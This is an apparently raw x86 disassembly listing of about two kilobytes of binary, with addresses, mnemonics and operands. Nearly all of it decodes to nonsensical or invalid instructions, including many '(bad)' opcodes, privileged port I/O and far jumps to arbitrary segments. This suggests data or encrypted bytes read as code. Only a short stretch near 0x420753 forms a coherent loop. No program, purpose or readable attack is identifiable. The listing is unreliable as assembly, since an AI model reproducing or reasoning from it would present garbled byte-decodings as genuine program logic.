  4204d3:	(bad)  
  4204d4:	test   DWORD PTR [edx-0x2974985b],0x7c4e976b
  4204de:	call   FWORD PTR [edx-0x2495466f]
  4204e4:	xor    eax,0xe66de21d
  4204e9:	mov    bh,0xc0
  4204eb:	add    ah,BYTE PTR [edx-0x6]
  4204ee:	adc    DWORD PTR [ecx],ecx
  4204f0:	icebp  
  4204f1:	sub    dh,bh
  4204f3:	outs   dx,DWORD PTR ds:[esi]
  4204f4:	adc    DWORD PTR [edx+ebp*2-0x2b],eax
  4204f8:	mov    al,0x32
  4204fa:	mov    eax,ds:0xf8fd962e
  4204ff:	not    DWORD PTR [edx+0x11d9e7d7]
  420505:	xor    al,0x26
  420507:	repnz sbb dh,BYTE PTR [esp+eiz*8+0x38]
  42050c:	gs cmp ch,bh
  42050f:	in     eax,dx
  420510:	imul   ebx,DWORD PTR [ebp+0x40280dda],0xffffffdb
  420517:	xlat   BYTE PTR ds:[ebx]
  420518:	inc    edi
  420519:	daa    
  42051a:	pusha  
  42051b:	(bad)  
  42051c:	leave  
  42051d:	das    
  42051e:	or     al,0x9d
  420520:	sbb    BYTE PTR [ecx],0x21
  420523:	test   al,0x9a
  420525:	in     eax,0x3c
  420527:	and    DWORD PTR [eax-0x1c],ebp
  42052a:	pop    edi
  42052b:	shr    BYTE PTR [esi-0x36],cl
  42052e:	out    dx,al
  42052f:	rcr    BYTE PTR [ecx+edi*4+0x38d72d4],cl
  420536:	sbb    cl,ah
  420538:	and    DWORD PTR [eax-0x10],eax
  42053b:	in     eax,0x3a
  42053d:	lock lods eax,DWORD PTR ds:[esi]
  42053f:	xchg   BYTE PTR [edx-0x72],cl
  420542:	popf   
  420543:	inc    edi
  420544:	push   edi
  420545:	loopne 0x42054b
  420547:	cli    
  420548:	add    eax,DWORD PTR [edx-0x411d5269]
  42054e:	sub    ah,BYTE PTR [eax+0x59ac5e]
  420554:	jge    0x4204f3
  420556:	mov    al,ds:0xafc40650
  42055b:	repnz push 0xffffff82
  42055e:	mov    al,ds:0x4be8cdac
  420563:	fsubr  DWORD PTR [ecx-0x325e79aa]
  420569:	daa    
  42056a:	arpl   cx,dx
  42056c:	dec    edx
  42056d:	loope  0x4205cc
  42056f:	adc    BYTE PTR [esi-0x7f0d0188],dh
  420575:	sub    DWORD PTR [eax],eax
  420577:	jmp    0x4205f6
  420579:	and    ecx,DWORD PTR [esi+0x22]
  42057c:	popa   
  42057d:	pop    ss
  42057e:	loopne 0x420542
  420580:	jg     0x420539
  420582:	ror    DWORD PTR [eax+edx*8+0x27549f42],0x46
  42058a:	rcr    DWORD PTR [ebx-0x4c3f0121],1
  420590:	pop    eax
  420591:	or     BYTE PTR [ebp-0x25553904],ah
  420597:	es mov esi,0x5a58d67a
  42059d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42059e:	adc    ebp,DWORD PTR [edi+0x32d93d9e]
  4205a4:	mov    edx,0x2e05de27
  4205a9:	rcr    BYTE PTR [esi],0x37
  4205ac:	inc    edx
  4205ad:	mov    BYTE PTR [edi+0x2f],ah
  4205b0:	and    DWORD PTR [edx-0x6f],0x5810e9ea
  4205b7:	adc    ebx,DWORD PTR [ecx-0xc5df1ae]
  4205bd:	out    0x6d,eax
  4205bf:	jne    0x4205be
  4205c1:	push   0x18
  4205c3:	ja     0x42060f
  4205c5:	push   eax
  4205c6:	mov    edx,0xab3b4835
  4205cb:	mov    ah,0x7c
  4205cd:	jecxz  0x4205dd
  4205cf:	outs   dx,DWORD PTR ds:[esi]
  4205d0:	mov    al,0xf7
  4205d2:	sbb    BYTE PTR [edi+0x6a060366],0x9a
  4205d9:	dec    ebp
  4205da:	or     dh,al
  4205dc:	dec    ebp
  4205dd:	(bad)  
  4205de:	in     al,0x87
  4205e0:	scas   al,BYTE PTR es:[edi]
  4205e1:	push   edi
  4205e2:	outs   dx,BYTE PTR ds:[esi]
  4205e3:	and    esi,ebx
  4205e5:	clc    
  4205e6:	inc    ebx
  4205e7:	jp     0x4205b7
  4205e9:	(bad)  
  4205eb:	shl    DWORD PTR [ecx-0x1f8b95e0],1
  4205f1:	dec    edx
  4205f2:	push   edx
  4205f3:	into   
  4205f4:	mov    edi,0x23fbe2f4
  4205f9:	xchg   ecx,eax
  4205fa:	dec    ecx
  4205fb:	mov    edi,0xfac6f9d5
  420600:	add    dh,BYTE PTR [esi*8+0x1c8dbaf0]
  420607:	test   eax,0x25936758
  42060c:	clc    
  42060d:	and    eax,0x47e94969
  420613:	add    DWORD PTR [edi+0x7e68e7c7],0xffffffaf
  42061a:	outs   dx,DWORD PTR ds:[esi]
  42061b:	sti    
  42061c:	and    DWORD PTR [eax],ebp
  42061e:	loop   0x42063d
  420620:	adc    esp,DWORD PTR [edx]
  420622:	inc    edx
  420623:	sti    
  420624:	push   es
  420625:	mov    al,0xd
  420627:	and    eax,0x60c8a00e
  42062c:	cld    
  42062d:	push   es
  42062e:	xchg   ecx,eax
  42062f:	jl     0x420628
  420631:	ror    DWORD PTR [esi-0x2a],1
  420634:	fwait
  420635:	out    dx,al
  420636:	sbb    eax,0xd2797b6
  42063b:	bound  ecx,QWORD PTR [edi]
  42063d:	pop    eax
  42063e:	js     0x420607
  420640:	cmp    eax,0xe57dc585
  420645:	mov    bh,0x78
  420647:	movnti DWORD PTR [edi],esp
  42064a:	les    esi,FWORD PTR [ebx+ebx*1-0x4dfea3f9]
  420651:	fbld   TBYTE PTR [ebx+0x7cd160c8]
  420657:	xchg   edx,eax
  420658:	xor    DWORD PTR [ecx],ebp
  42065a:	xor    bh,BYTE PTR [ebx]
  42065c:	je     0x42067c
  42065e:	inc    edi
  42065f:	pop    edi
  420660:	sbb    cl,al
  420662:	dec    DWORD PTR [esp+edx*8-0x78]
  420666:	xchg   edi,eax
  420667:	xor    eax,0x269978d6
  42066c:	call   0x4169:0x2fdd8fe1
  420673:	hlt    
  420674:	test   eax,0x99ae6943
  420679:	and    ebp,esp
  42067b:	cwde   
  42067c:	jmp    ebx
  42067e:	mov    ds:0xc0df4f2d,eax
  420683:	xchg   ebp,eax
  420684:	ficomp WORD PTR [edi+0x1d]
  420687:	jae    0x420703
  420689:	jle    0x42065b
  42068b:	ins    BYTE PTR es:[edi],dx
  42068c:	xchg   esp,eax
  42068d:	mov    ds:0x2e907d91,al
  420692:	push   ecx
  420693:	xor    eax,0xb41fc5e1
  420698:	repz pop edx
  42069a:	sub    DWORD PTR [edi+0x41],edi
  42069d:	hlt    
  42069e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42069f:	push   ds
  4206a0:	sbb    DWORD PTR [ebx],esi
  4206a2:	adc    eax,0x9f53f3ae
  4206a7:	lea    ecx,[eax-0x7830dab1]
  4206ad:	popf   
  4206ae:	xchg   esi,eax
  4206af:	pushf  
  4206b0:	mov    cl,0xa5
  4206b2:	adc    esp,DWORD PTR [eax-0x6f]
  4206b5:	out    0xb3,eax
  4206b7:	xchg   esi,eax
  4206b8:	sub    cl,BYTE PTR [edi+0x28]
  4206bb:	test   BYTE PTR [ebp+0x2e],dl
  4206be:	sbb    eax,edx
  4206c0:	lea    ebp,[ebx]
  4206c2:	pop    edx
  4206c3:	icebp  
  4206c4:	mov    bh,0x5f
  4206c6:	jne    0x4206b8
  4206c8:	inc    ecx
  4206c9:	adc    edi,edx
  4206cb:	ds and al,0xd
  4206ce:	xchg   ebp,eax
  4206cf:	(bad)
  4206d2:	or     esp,eax
  4206d4:	(bad)
  4206d8:	and    ebx,ebx
  4206da:	(bad)  
  4206db:	and    DWORD PTR [esi],edx
  4206dd:	(bad)  
  4206de:	mov    cl,0x3a
  4206e0:	loope  0x420720
  4206e2:	inc    ebp
  4206e3:	in     eax,0x94
  4206e5:	fstp   DWORD PTR [esi-0x2a]
  4206e8:	xor    ecx,DWORD PTR ds:0xbdab8ef6
  4206ee:	test   al,0xb7
  4206f0:	nop
  4206f1:	aas    
  4206f2:	shr    DWORD PTR [edi-0x2912e5a2],0xa3
  4206f9:	call   0xaf484dde
  4206fe:	xchg   ebx,eax
  4206ff:	and    BYTE PTR [edi-0x5c6d9c1e],dh
  420705:	mov    ds:0xd74118ed,al
  42070a:	sbb    eax,0xd1c4cb8d
  42070f:	scas   al,BYTE PTR es:[edi]
  420710:	pmulhuw mm6,mm2
  420713:	rol    bh,cl
  420715:	es cld 
  420717:	adc    DWORD PTR [ebx-0x40],ebx
  42071a:	aam    0x3c
  42071c:	push   DWORD PTR [eax-0x1dde964b]
  420722:	adc    ecx,DWORD PTR [ebp-0x5154a39b]
  420728:	pop    eax
  420729:	mov    esp,edx
  42072b:	push   eax
  42072c:	mov    ah,0xba
  42072e:	stc    
  42072f:	jae    0x420791
  420731:	fisubr WORD PTR ss:[ebx]
  420734:	jns    0x4206f5
  420736:	xor    al,0xe3
  420738:	cmp    eax,esp
  42073a:	mov    al,ds:0x403da4f
  42073f:	fisubr WORD PTR [ebx+0x69]
  420742:	sub    eax,0x91044b05
  420747:	jbe    0x420705
  420749:	shl    esi,0x56
  42074c:	das    
  42074d:	xor    edx,0x6dda
  420753:	mov    esi,DWORD PTR [ebp-0x108]
  420759:	and    edx,esi
  42075b:	and    edx,0xe0c
  420761:	or     edx,0x5b
  420764:	mov    esi,DWORD PTR [ebp-0xe8]
  42076a:	mov    ecx,DWORD PTR [esi+ecx*1+0x1c]
  42076e:	add    ecx,eax
  420770:	lea    eax,[edx+ecx*1-0xc5b]
  420777:	mov    DWORD PTR [ebp-0xa8],eax
  42077d:	and    DWORD PTR [ebp-0x144],0x0
  420784:	jmp    0x420b7d
  420789:	mov    eax,DWORD PTR [ebp-0x144]
  42078f:	inc    eax
  420790:	mov    DWORD PTR [ebp-0x144],eax
  420796:	jmp    0x420b7d
  42079b:	daa    
  42079c:	cmp    eax,0x75b775ce
  4207a1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4207a2:	(bad)  
  4207a3:	xchg   ecx,eax
  4207a4:	(bad)  
  4207a5:	dec    esi
  4207a6:	sahf   
  4207a7:	lods   eax,DWORD PTR ds:[esi]
  4207a8:	jns    0x42081a
  4207aa:	fnstsw WORD PTR [ebx+eiz*4-0x40]
  4207ae:	mov    esi,0xbebec44a
  4207b3:	push   ebp
  4207b4:	mov    al,BYTE PTR [ebx-0x77d9da76]
  4207ba:	(bad)  
  4207bc:	mov    dh,0x52
  4207be:	sbb    DWORD PTR [edx+0x38aa0581],edi
  4207c4:	dec    ebx
  4207c5:	mov    DWORD PTR ds:0xca0c8ee3,ebx
  4207cb:	lea    ebp,ds:0xcf31c6f6
  4207d1:	mov    dl,0x4d
  4207d3:	mov    esi,0xf407125f
  4207d8:	fndisi(8087 only) 
  4207da:	jo     0x4207d0
  4207dc:	xchg   DWORD PTR [esi],edi
  4207de:	pop    ebx
  4207df:	pusha  
  4207e0:	jnp    0x4207be
  4207e2:	push   es
  4207e3:	out    0xa4,eax
  4207e5:	test   DWORD PTR [ebp-0x76],ecx
  4207e8:	shl    DWORD PTR [ecx+0x12f5165b],cl
  4207ee:	out    dx,al
  4207ef:	jns    0x4207c7
  4207f1:	imul   ebp,DWORD PTR [edi],0xd
  4207f4:	xor    BYTE PTR [edx+0x13],ah
  4207f7:	mov    ecx,fs
  4207f9:	iret   
  4207fa:	dec    ebx
  4207fb:	pop    ds
  4207fc:	jmp    0x850a:0x6690521e
  420803:	jp     0x420833
  420805:	outs   dx,DWORD PTR ds:[esi]
  420806:	add    DWORD PTR [ebx+0x207f1ace],ebx
  42080c:	pop    ds
  42080d:	int    0x3a
  42080f:	dec    esi
  420810:	stos   BYTE PTR es:[edi],al
  420811:	in     al,dx
  420812:	imul   ebp,ebp,0x9136e5e0
  420818:	mov    eax,ds:0xf077f9d2
  42081d:	test   al,0xbe
  42081f:	and    DWORD PTR [ebx-0x35215538],ebp
  420825:	adc    eax,0x591d8878
  42082a:	xor    edx,DWORD PTR ds:0x5ec53910
  420830:	xchg   esi,eax
  420831:	pop    ds
  420832:	inc    ecx
  420833:	fadd   QWORD PTR [ebx+eiz*2-0x119ad8ab]
  42083a:	ret    
  42083b:	sbb    BYTE PTR [ecx],al
  42083d:	adc    eax,0x394d5d7b
  420842:	out    0x28,eax
  420844:	clc    
  420845:	es iret 
  420847:	cld    
  420848:	fdiv   QWORD PTR [esi+0x67e429a]
  42084e:	out    0x92,eax
  420850:	sub    DWORD PTR [edx+0x61645738],edx
  420856:	sbb    bh,BYTE PTR [edi-0x54]
  420859:	mov    dh,0x6a
  42085b:	std    
  42085c:	int    0xda
  42085e:	adc    al,BYTE PTR [ecx+0x4b]
  420861:	inc    eax
  420862:	push   ecx
  420863:	or     al,0x7c
  420865:	ficom  DWORD PTR [ecx+0x4042ea14]
  42086b:	shr    ah,1
  42086d:	mov    ebp,0x8453e55d
  420872:	data16 das 
  420874:	pop    esi
  420875:	hlt    
  420876:	rcl    edx,1
  420878:	ins    DWORD PTR es:[edi],dx
  420879:	adc    bl,bl
  42087b:	lock pop ds
  42087d:	and    eax,DWORD PTR [esi+esi*2+0x5e707058]
  420884:	mov    ch,0x5c
  420886:	scas   al,BYTE PTR es:[edi]
  420887:	test   al,0x98
  420889:	jns    0x42085c
  42088b:	xor    DWORD PTR [esp+ecx*2],esp
  42088e:	imul   edi
  420890:	rcl    ch,cl
  420892:	jne    0x42087d
  420894:	dec    esp
  420895:	inc    ecx
  420896:	pop    ds
  420897:	or     eax,0xe855205e
  42089c:	repz pop ds
  42089e:	pusha  
  42089f:	or     al,0xc0
  4208a1:	xor    BYTE PTR [esi+edi*8-0x51e5685d],0x45
  4208a9:	mov    eax,ds:0x7cda205e
  4208ae:	(bad)
  4208b1:	aad    0x1e
  4208b3:	and    eax,DWORD PTR [edi]
  4208b5:	shl    BYTE PTR [edi-0x52c5e78a],cl
  4208bb:	in     eax,dx
  4208bc:	ins    DWORD PTR es:[edi],dx
  4208bd:	push   ebx
  4208be:	cmp    ecx,DWORD PTR [eax+eiz*8-0x36]
  4208c2:	dec    ecx
  4208c3:	or     eax,esi
  4208c5:	aad    0xba
  4208c7:	add    edi,DWORD PTR [edi]
  4208c9:	add    eax,0x28009f9
  4208ce:	pop    eax
  4208cf:	test   DWORD PTR [ebp-0x6d25032c],ebx
  4208d5:	icebp  
  4208d6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4208d7:	into   
  4208d8:	or     al,0xfc
  4208da:	push   cs
  4208db:	dec    edi
  4208dc:	int    0x63
  4208de:	loop   0x420953
  4208e0:	sahf   
  4208e1:	fucomp st(3)
  4208e3:	mov    eax,0xeb2ed8bd
  4208e8:	jg     0x4208c1
  4208ea:	rcl    DWORD PTR [esi],0x29
  4208ed:	stc    
  4208ee:	clc    
  4208ef:	es das 
  4208f1:	pop    ebx
  4208f2:	icebp  
  4208f3:	rcl    DWORD PTR [esi+0x4a65a934],0xa4
  4208fa:	dec    edx
  4208fb:	cmp    ebx,esp
  4208fd:	aas    
  4208fe:	jmp    0x5c60:0x1b968a3a
  420905:	xchg   edx,eax
  420906:	mov    es,ebx
  420908:	mov    bh,0x3d
  42090a:	add    ah,bh
  42090c:	retf   
  42090d:	or     dh,BYTE PTR [edi+0x5036bb29]
  420913:	add    eax,0x1280ea0
  420918:	(bad)  
  420919:	sub    eax,0x9afdcde2
  42091e:	mov    ch,0xb7
  420920:	cmp    al,0x35
  420922:	out    0x6e,al
  420924:	pop    esp
  420925:	mov    esp,0x8b431d32
  42092a:	mov    edi,0x8f7cc93c
  42092f:	outs   dx,DWORD PTR ds:[esi]
  420930:	pop    ebp
  420931:	(bad)  
  420932:	jne    0x420959
  420934:	xor    ebx,ebp
  420936:	xor    eax,0xa8d40b24
  42093b:	inc    edx
  42093c:	mov    edi,0x321bba21
  420941:	je     0x4209b1
  420943:	pop    edi
  420944:	or     BYTE PTR [ecx-0x36],0x7c
  420948:	cmovnp ecx,DWORD PTR [ebx+0x607e47df]
  42094f:	adc    cl,bh
  420951:	mov    dh,0xde
  420953:	int    0x67
  420955:	enter  0xd6e9,0xc
  420959:	or     eax,0x420b5b9b
  42095e:	jne    0x4208e6
  420960:	and    BYTE PTR [edx+0x23dc57bb],dl
  420966:	ins    BYTE PTR es:[edi],dx
  420967:	push   esp
  420968:	js     0x4209e1
  42096a:	sar    BYTE PTR [ecx],1
  42096c:	inc    BYTE PTR [edx-0x4]
  42096f:	ja     0x420953
  420971:	fcomp  QWORD PTR [eax]
  420973:	adc    DWORD PTR [ecx+0x55],edi
  420976:	pusha  
  420977:	and    BYTE PTR [eax-0x422536d0],al
  42097d:	loopne 0x4209cb
  42097f:	mov    bl,BYTE PTR [esi-0x38]
  420982:	xor    esi,DWORD PTR gs:[esi+0x784d3026]
  420989:	mov    WORD PTR [ecx-0x52f2bc72],?
  42098f:	mov    ah,0xa6
  420991:	pushf  
  420992:	cmp    DWORD PTR [edi+ebp*1-0x1],esi
  420996:	ret    
  420997:	xchg   ebp,eax
  420998:	xchg   ebp,eax
  420999:	cmp    al,0xf0
  42099b:	sub    bl,BYTE PTR [esi+0x32]
  42099e:	aam    0xdb
  4209a0:	jecxz  0x420944
  4209a2:	add    DWORD PTR [esi+0x17050f7f],esi
  4209a8:	jo     0x4209f6
  4209aa:	mov    bh,0x23
  4209ac:	test   al,0x16
  4209ae:	ror    edx,0x5f
  4209b1:	push   es
  4209b2:	add    bh,bl
  4209b4:	xor    eax,0xe423456b
  4209b9:	sub    al,0x52
  4209bb:	test   al,0xe
  4209bd:	and    al,0x83
  4209bf:	data16 fcomp QWORD PTR [edx-0x195fabd3]
  4209c6:	fistp  DWORD PTR [ebp+0x9]
  4209c9:	dec    esp
  4209ca:	jb     0x4209ac
  4209cc:	mov    es,WORD PTR [ecx-0x3c0a9165]
  4209d2:	jmp    0xe665:0x82979a81
  4209d9:	out    0xd5,al
  4209db:	and    dh,BYTE PTR [ebx+0x2111026a]
  4209e1:	mov    ds:0xc1babc7a,eax
  4209e6:	mov    eax,0xc81b51a2
  4209eb:	mov    bl,0x8e
  4209ed:	sub    BYTE PTR [edi+esi*8],ch
  4209f0:	pop    es
  4209f1:	fst    QWORD PTR [edx-0x94a5d04]
  4209f7:	sub    ebx,DWORD PTR [ebx-0x3b]
  4209fa:	push   ecx
  4209fb:	loop   0x420a07
  4209fd:	mov    esi,0xbe3b8e38
  420a02:	xchg   ebp,eax
  420a03:	jo     0x420a11
  420a05:	dec    ebp
  420a06:	(bad)  
  420a07:	sbb    ch,BYTE PTR [edi-0x675d35ee]
  420a0d:	jecxz  0x420a76
  420a0f:	sub    DWORD PTR ds:[eax+eiz*1+0x72fd2b8b],esi
  420a17:	hlt    
  420a18:	cmp    edx,DWORD PTR [eax+esi*8]
  420a1b:	cwde   
  420a1c:	cli    
  420a1d:	test   eax,0x33b8de78
  420a22:	xchg   BYTE PTR [ebp-0xb],dh
  420a25:	outs   dx,DWORD PTR ds:[esi]
  420a26:	push   DWORD PTR [eax*2+0x5750ed11]
  420a2d:	repz test DWORD PTR [ecx],eax
  420a30:	xor    eax,0x2d85c9b0
  420a35:	or     edi,DWORD PTR [ebp+edi*4-0x3b49a0ed]
  420a3c:	stos   BYTE PTR es:[edi],al
  420a3d:	pop    edx
  420a3e:	mov    edx,0x3fa642b2
  420a43:	cmp    BYTE PTR [ebx-0x6dca566a],cl
  420a49:	pop    eax
  420a4a:	loop   0x420a17
  420a4c:	(bad)  
  420a4d:	es xor al,0xd0
  420a50:	test   BYTE PTR [edi+0x6ba165c5],bl
  420a56:	inc    ecx
  420a57:	push   es
  420a58:	cdq    
  420a59:	adc    ebp,DWORD PTR [esi-0xcb98368]
  420a5f:	aad    0xa9
  420a61:	out    0x5e,al
  420a63:	jne    0x420add
  420a65:	cmp    BYTE PTR [ecx-0x2aa3434a],bh
  420a6b:	je     0x420aad
  420a6d:	mov    eax,ds:0xecac0c1
  420a72:	repnz jmp 0x196a:0x3bd5727f
  420a7a:	push   edi
  420a7b:	(bad)  
  420a7c:	hlt    
  420a7d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420a7e:	popa   
  420a7f:	sbb    DWORD PTR [edi+0x5a5d1410],0xe5c0299b
  420a89:	retf   
  420a8a:	stc    
  420a8b:	mov    ah,bh
  420a8d:	aaa    
  420a8e:	icebp  
  420a8f:	or     ebp,eax
  420a91:	inc    DWORD PTR [ecx+0x31]
  420a94:	add    dl,BYTE PTR [ecx]
  420a96:	push   ds
  420a97:	arpl   WORD PTR [edi-0x31],cx
  420a9a:	sahf   
  420a9b:	xchg   esp,eax
  420a9c:	lods   eax,DWORD PTR ds:[esi]
  420a9d:	mov    ebx,ebx
  420a9f:	pop    ebx
  420aa0:	call   0x59d:0x439f21e8
  420aa7:	aam    0xcb
  420aa9:	add    ah,dl
  420aab:	retf   0xfab0
  420aae:	into   
  420aaf:	les    edi,FWORD PTR [eax]
  420ab1:	xchg   ecx,eax
  420ab2:	push   esi
  420ab3:	fisubr WORD PTR [edx+edi*4-0x6503a426]
  420aba:	add    DWORD PTR [ebp-0x40],edx
  420abd:	or     BYTE PTR [ebp-0x6cfb995],0x86
  420ac4:	dec    ebx
  420ac5:	push   es
  420ac6:	xchg   edi,edi
  420ac8:	mov    eax,DWORD PTR [edx*8-0x608008d5]
  420acf:	lds    ebp,FWORD PTR [edi-0x3f3739cd]
  420ad5:	xor    DWORD PTR [ecx],ecx
  420ad7:	xor    BYTE PTR [ebp-0x24],al
  420ada:	cli    
  420adb:	sub    al,0xe7
  420add:	ss mov gs:0x25806ef8,al
  420ae4:	stos   DWORD PTR es:[edi],eax
  420ae5:	adc    al,0x13
  420ae7:	push   0x410c9e66
  420aec:	dec    edi
  420aed:	(bad)  
  420aee:	aaa    
  420aef:	sbb    ecx,DWORD PTR [esp+edi*4+0x2b]
  420af3:	mov    bh,0xfa
  420af5:	sbb    ch,BYTE PTR [edx-0xc]
  420af8:	push   es
  420af9:	sub    DWORD PTR [esi+0x2a],ebp
  420afc:	aaa    
  420afd:	jmp    FWORD PTR ss:[si]
  420b01:	sbb    edx,ecx
  420b03:	ret    0xba9d
  420b06:	jg     0x420b80
  420b08:	mov    bh,0x20
  420b0a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420b0b:	cmp    eax,0x9b325d63
  420b10:	daa    
  420b11:	xchg   edi,eax
  420b12:	cld    
  420b13:	jb     0x420ae2
  420b15:	adc    al,0x86
  420b17:	xchg   ecx,eax
  420b18:	(bad)  
  420b1a:	shr    BYTE PTR [ebx+ebx*2+0x4a],0x75
  420b1f:	add    eax,0x1ced5535
  420b24:	sbb    DWORD PTR ds:0xf26598a5,esi
  420b2a:	mov    ecx,0xe362b151
  420b2f:	jl     0x420b40
  420b31:	push   eax
  420b32:	rol    BYTE PTR [ecx+ebx*2+0x11861611],cl
  420b39:	inc    esi
  420b3a:	xchg   DWORD PTR [ebx-0x42],ebp
  420b3d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420b3e:	punpckhbw mm4,mm5
  420b41:	ror    BYTE PTR [ebx-0x50d10617],0x99
  420b48:	inc    esp
  420b49:	mov    ?,esp
  420b4b:	test   esi,ebx
  420b4d:	cmp    al,0xde
  420b4f:	jp     0x420b7b
  420b51:	pop    esp
  420b52:	outs   dx,BYTE PTR ds:[esi]
  420b53:	dec    ebp
  420b54:	mov    edi,0xf7432d
  420b59:	or     bh,BYTE PTR [ebp+0x5]
  420b5c:	sub    BYTE PTR [ebx+eax*8],bh
  420b5f:	div    ah
  420b61:	dec    eax
  420b62:	or     bl,al
  420b64:	xchg   esi,eax
  420b65:	loopne 0x420b3d
  420b67:	mov    esp,0x308d995d
  420b6c:	or     al,0x7a
  420b6e:	mov    al,ds:0x573202ab
  420b73:	push   ds
  420b74:	inc    eax
  420b75:	fld    DWORD PTR [ebp+0x67aaee02]
  420b7b:	mov    esi,0x18858b2e
  420b80:	(bad)  
  420b81:	(bad)  
  420b82:	dec    DWORD PTR [ebx-0x14373]
  420b88:	(bad)  
  420b89:	jmp    0x420f70
  420b8e:	jo     0x420be5
  420b90:	mov    es,WORD PTR [eax+edi*4-0x74]
  420b94:	mov    ah,0x79
  420b96:	rcl    ah,cl
  420b98:	mov    WORD PTR [esp+edx*4+0x8dd721f],fs
  420b9f:	stos   DWORD PTR es:[edi],eax
  420ba0:	sar    BYTE PTR [esi-0x41413bb6],0xbe
  420ba7:	ins    DWORD PTR es:[edi],dx
  420ba8:	cdq    
  420ba9:	mov    bh,BYTE PTR [ebx-0x51eb50ab]
  420baf:	add    bl,cl
  420bb1:	jmp    0x115a:0x45359e73
  420bb8:	hlt    
  420bb9:	lock sbb al,0xee
  420bbc:	inc    ecx
  420bbd:	fsubr  DWORD PTR [ebx]
  420bbf:	lock mov WORD PTR [ecx],gs
  420bc2:	(bad)
  420bc5:	fcom   st(6)
  420bc7:	cmp    ah,BYTE PTR [ecx-0x6c]
  420bca:	sbb    ecx,edi
  420bcc:	jae    0x420b8e
  420bce:	jne    0x420bf7
  420bd0:	popf   
  420bd1:	es dec esi
  420bd3:	ret    0xf229
  420bd6:	test   DWORD PTR [edi],0x97b633d9
  420bdc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420bdd:	cmp    BYTE PTR [ecx-0x74],cl
  420be0:	or     BYTE PTR [eax-0x7a],dl
  420be3:	ds leave 
  420be5:	sub    esi,DWORD PTR [eax-0x7e1bbeb4]
  420beb:	stc    
  420bec:	pop    es
  420bed:	push   ds
  420bee:	int3   
  420bef:	cdq    
  420bf0:	ret    0x6dcd
  420bf3:	pop    ss
  420bf4:	add    al,cl
  420bf6:	ret    
  420bf7:	jne    0x420bd2
  420bf9:	cmp    BYTE PTR [ecx+0x72ab96b3],bh
  420bff:	jbe    0x420c75
  420c01:	mov    ds:0x4898b08e,eax
  420c06:	mov    edi,0xef8568f1
  420c0b:	popf   
  420c0c:	or     bl,BYTE PTR [edx+0x66]
  420c0f:	inc    esi
  420c10:	scas   eax,DWORD PTR es:[edi]
  420c11:	sub    BYTE PTR [edi+0x4e],cl
  420c14:	adc    al,0x3a
  420c16:	xor    edi,ebp
  420c18:	les    edi,FWORD PTR [eax]
  420c1a:	push   edx
  420c1b:	retf   
  420c1c:	ss ret 0xc448
  420c20:	jecxz  0x420c7c
  420c22:	sub    al,ch
  420c24:	push   0xcf674f39
  420c29:	shr    al,cl
  420c2b:	xlat   BYTE PTR ds:[ebx]
  420c2d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420c2e:	mov    bh,0xcd
  420c30:	outs   dx,BYTE PTR ds:[esi]
  420c31:	jo     0x420bdb
  420c33:	mov    eax,0x9ddbd9b0
  420c38:	mov    ch,0xdd
  420c3a:	and    BYTE PTR [edx+0x2dd5cf35],bh
  420c40:	jmp    0xdcef:0x124b9032
  420c47:	sbb    BYTE PTR [esp+ecx*8],bl
  420c4a:	pop    ebp
  420c4b:	xor    dl,bh
  420c4d:	ror    edx,0x96
  420c50:	and    DWORD PTR [eax-0x75d13a28],0x5c2a2c
  420c5a:	inc    ebp
  420c5b:	sub    eax,0x5038a83b
  420c60:	out    dx,eax
  420c61:	and    esp,0x4d67f122
  420c67:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420c68:	out    dx,al
  420c69:	shl    BYTE PTR [ecx+0x516ffbc1],0x6b
  420c70:	test   al,0x31
  420c72:	iret   
  420c73:	mov    ds:0x5bb14690,eax
  420c78:	or     eax,0xf2b71b9e
  420c7d:	scas   al,BYTE PTR es:[edi]
  420c7e:	and    DWORD PTR [edx-0x16],ebp
  420c81:	adc    esi,DWORD PTR [esp+edx*2+0x53]
  420c85:	sub    DWORD PTR [ecx],eax
  420c87:	inc    ecx
  420c88:	dec    esp
  420c89:	inc    edi
  420c8a:	or     DWORD PTR [ebx+0x7f],edi
  420c8d:	sete   BYTE PTR [ecx+0x438de623]
  420c94:	test   ebp,ebx
  420c96:	jp     0x420c20
  420c98:	inc    ebp
  420c99:	div    DWORD PTR [ebp+0x17]
  420c9c:	call   0xe1e3:0x793f6f85
  420ca3:	or     eax,0x33212d01
  420ca8:	jmp    FWORD PTR [edi-0x2f6b675d]
  420cae:	das    
  420caf:	mov    edi,DWORD PTR [edx-0x7902f900]
  420cb5:	mov    ebx,0x8c9bdbbd
  420cba:	xchg   ebx,eax
  420cbb:	dec    DWORD PTR [edi+edi*2+0x23]
  420cbf:	and    al,0x41
  420cc1:	sbb    edx,esp
  420cc3:	rcr    DWORD PTR [eax],1
  420cc5:	test   edx,eax
  420cc7:	inc    eax
  420cc8:	xchg   ebp,eax
  420cc9:	sbb    DWORD PTR [ebp+0x5f],ebx
  420ccc:	push   cs
  420ccd:	mov    ecx,0xc2ba2357
  420cd2:	pop    ss
  420cd3:	int3   
  420cd4:	xchg   ebx,eax
  420cd5:	add    DWORD PTR [edi-0x3],edx
  420cd8:	mov    ebp,ss
  420cda:	neg    DWORD PTR [ebp-0x2d]
  420cdd:	mov    ecx,0xa5ad541c
  420ce2:	push   esi
  420ce3:	leave  
  420ce4:	call   0x4a747069
  420ce9:	stos   BYTE PTR es:[edi],al
  420cea:	inc    ecx
  420ceb:	add    al,0xd7
  420ced:	sbb    al,0x60
  420cef:	popf   
  420cf0:	cmp    DWORD PTR [edx+0x1e],esp
  420cf3:	scas   al,BYTE PTR es:[edi]
  420cf4:	test   BYTE PTR [eax-0x216ac665],cl
  420cfa:	mov    ch,0xce
  420cfc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420cfd:	inc    eax
  420cfe:	mov    esp,0x1d67f44f
  420d03:	jae    0x420d3e
  420d05:	test   al,0x91
  420d07:	mov    dl,0xac
  420d09:	mov    ch,0xa9
  420d0b:	popf   
  420d0c:	aad    0x7c
